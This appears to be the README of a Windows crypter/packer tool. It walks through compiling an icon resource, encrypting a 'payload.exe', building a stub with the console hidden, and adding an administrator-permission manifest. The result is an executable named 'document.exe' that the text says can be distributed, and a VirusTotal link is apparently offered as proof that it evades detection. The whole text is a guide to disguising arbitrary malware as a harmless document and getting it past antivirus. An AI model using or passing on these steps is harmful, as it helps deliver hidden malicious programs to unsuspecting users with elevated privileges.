[VirusTotal Demo](virustotal.png)
Link: https://www.virustotal.com/gui/file/82e4a83ec6c6d5976783f33007f4b3d5ddf2e6d7b8f11b7c6a7d2a87d4e8867f?nocache=1
##Usage

### Creating a resource file for your icon so you can embed it in the executable:
1. Put your icon in the same directory as crypter.c, stub.c, resource.rc, and manifest.xml.
2. Rename the icon to `appicon.ico`.
3. Compile the resource file: `windres resource.rc -O coff -o resource.res`
    - This will create a compiled version of your icon in the same directory titled `resource.res`.

### Creating the packed executable:
1. Put your payload executable in the same directory as crypter.c, stub.c, resource.rc, and manifest.xml.
2. Rename your payload executable to `payload.exe`.
3. Compile crypter: `gcc crypter.c -o crypter.exe`.
4. Run the crypter: `./crypter.exe`.
4. Compile stub/packer: `gcc stub.c resource.res -o document.exe -mwindows`.
    - You can change `document` to whatever you like.
    - `resource.res` adds the resource (icon) file
    - `-mwindows` supresses the console from showing.
5. Add administrator persmission request to the packed executable: `mt.exe -manifest manifest.xml -outputresource:document.exe;#1`
    - Don't forget to change `document` if you changed it earlier.
6. It will create document.exe, which you can now distribute.